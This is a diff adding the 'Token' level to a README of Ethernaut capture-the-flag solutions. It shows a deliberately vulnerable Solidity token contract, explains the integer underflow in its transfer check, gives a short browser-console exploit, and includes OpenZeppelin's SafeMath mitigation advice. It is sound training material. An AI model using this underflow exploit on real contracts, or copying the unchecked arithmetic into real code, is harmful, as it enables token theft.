@@ -54,6 +54,16 @@ My [Ethernaut](https://ethernaut.openzeppelin.com/) CTF Solutions.
 </ol>
 </details>
 
+<details>
+<summary>
+<a href="#05-token">05. Token</a>
+</summary>
+<ol>
+    <li><a href="./contracts/05-token/">Contracts</a></li>
+    <li><a href="./scripts/05-token.ts">Script</a></li>
+</ol>
+</details>
+
 ## 00. Hello Ethernaut
 
 This is a warm-up task. Call `await contract.info()` in the console and follow the instructions.
@@ -560,3 +570,103 @@ function () payable {
 </details>
 
 <a href='./contracts/04-telephone/'>Contracts</a> | <a href='./scripts/04-telephone.ts'>Script</a>
+
+## 05. Token
+
+### Challenge
+
+The goal of this level is for you to hack the basic token contract below.
+
+You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.
+
+Things that might help:
+
+- What is an odometer?
+
+<details>
+  <summary>Instance</summary>
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Token {
+
+  mapping(address => uint) balances;
+  uint public totalSupply;
+
+  constructor(uint _initialSupply) public {
+    balances[msg.sender] = totalSupply = _initialSupply;
+  }
+
+  function transfer(address _to, uint _value) public returns (bool) {
+    require(balances[msg.sender] - _value >= 0);
+    balances[msg.sender] -= _value;
+    balances[_to] += _value;
+    return true;
+  }
+
+  function balanceOf(address _owner) public view returns (uint balance) {
+    return balances[_owner];
+  }
+}
+```
+
+</details>
+
+### Solution
+
+<details>
+  <summary>Description</summary>
+
+Solidity versions below 0.8.0 do not have overflow/underflow checking. Therefore, if we subtract 1 from the minimum value, we get the maximum possible value. We can use this to get more tokens than we are entitled to.
+
+To protect yourself from this, in compiler versions below 0.8.0 we can use the [SafeMath](https://docs.openzeppelin.com/contracts/2.x/api/math#SafeMath) library from OpenZeppelin.
+
+So to get a large number of tokens we do the following:
+
+1. We get our current balance of tokens.
+2. We add 1 to it to cause underflow. Thanks to this, we will pass the `require(balances[msg.sender] - _value >= 0);` check and get a large number of tokens here `balances[msg.sender] -= _value;`
+3. The challenge is completed.
+</details>
+
+<details>
+  <summary>Browser Console Solution</summary>
+
+```javascript
+// 1
+const initialBalance = await contract.balanceOf(player);
+
+// 2
+const amountToTransfer = initialBalance + 1;
+
+// 3
+await contract.transfer(_ethers.constants.AddressZero, amountToTransfer);
+```
+
+Then click the "Submit instance" button.
+
+Congratulations! :wink: Let's move on to the next challenge! :running:
+
+</details>
+
+<details>
+  <summary>Comments From OpenZeppelin</summary>
+
+Overflows are very common in solidity and must be checked for with control statements such as:
+
+```solidity
+if(a + c > a) {
+  a = a + c;
+}
+```
+
+An easier alternative is to use OpenZeppelin's [SafeMath](https://docs.openzeppelin.com/contracts/2.x/api/math#SafeMath) library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:
+
+`a = a.add(c);`
+
+If there is an overflow, the code will revert.
+
+</details>
+
+<a href='./contracts/05-token/'>Contracts</a> | <a href='./scripts/05-token.ts'>Script</a>
